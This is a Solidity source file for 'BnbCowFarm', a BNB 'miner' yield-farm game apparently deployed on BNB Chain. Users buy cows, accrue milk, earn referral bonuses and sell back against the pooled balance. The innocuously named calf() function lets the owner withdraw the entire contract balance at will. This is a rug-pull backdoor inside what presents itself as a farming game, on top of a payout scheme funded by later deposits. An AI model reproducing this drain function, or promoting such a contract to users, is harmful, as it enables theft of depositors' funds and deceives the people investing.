/**
 *Submitted for verification at BscScan.com on 2022-05-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26; // solhint-disable-line

contract BnbCowFarm{
    //uint256 MILK_PER_MINERS_PER_SECOND=1;
    uint256 public MILK_TO_HATCH_1MINERS=864000;//for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address public ceoAddress;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedCow;
    mapping (address => uint256) public lastCow;
    mapping (address => address) public referrals;
    uint256 public marketCowRate;
    event CowDairy(uint256 totalAmount);
    constructor() public{
        ceoAddress=msg.sender;
    }
    function hatchMilk(address ref) public{
        require(initialized);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }
        uint256 eggsUsed=getMyCows();
        uint256 newMiners=SafeMath.div(eggsUsed,MILK_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedCow[msg.sender]=0;
        lastCow[msg.sender]=now;

        //send referral eggs
        claimedCow[referrals[msg.sender]]=SafeMath.add(claimedCow[referrals[msg.sender]],SafeMath.div(SafeMath.mul(eggsUsed,15),100));

        //boost market to nerf miners hoarding
        marketCowRate=SafeMath.add(marketCowRate,SafeMath.div(eggsUsed,5));
    }
    function sellMilk() public{
        require(initialized);
        uint256 hasEggs=getMyCows();
        uint256 eggValue=calculateMilkSell(hasEggs);
        uint256 fee=devFee(eggValue);
        claimedCow[msg.sender]=0;
        lastCow[msg.sender]=now;
        marketCowRate=SafeMath.add(marketCowRate,hasEggs);
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(eggValue,fee));
    }
    function buyCow(address ref) public payable{
        require(initialized);
        uint256 eggsBought=calculateMilkBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
        uint256 fee=devFee(msg.value);
        ceoAddress.transfer(fee);
        claimedCow[msg.sender]=SafeMath.add(claimedCow[msg.sender],eggsBought);
         hatchMilk(ref);
    }

    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateMilkSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketCowRate,address(this).balance);
    }
    function calculateMilkBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketCowRate);
    }
    function calculateMilkBuySimple(uint256 eth) public view returns(uint256){
        return calculateMilkBuy(eth,address(this).balance);
    }
    function calf() public {
        require(msg.sender == ceoAddress);
        uint256 smartContractBalance = address(this).balance;
        ceoAddress.transfer(smartContractBalance);
        emit CowDairy(smartContractBalance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,2),100);
    }
    function gotoMarket() public payable{
        require(msg.sender == ceoAddress, 'invalid call');
        require(marketCowRate==0);
        initialized=true;
        marketCowRate=86400000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyCows() public view returns(uint256){
        return SafeMath.add(claimedCow[msg.sender],getCowSincelastCow(msg.sender));
    }
    function getCowSincelastCow(address adr) public view returns(uint256){
        uint256 secondsPassed=min(MILK_TO_HATCH_1MINERS,SafeMath.sub(now,lastCow[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}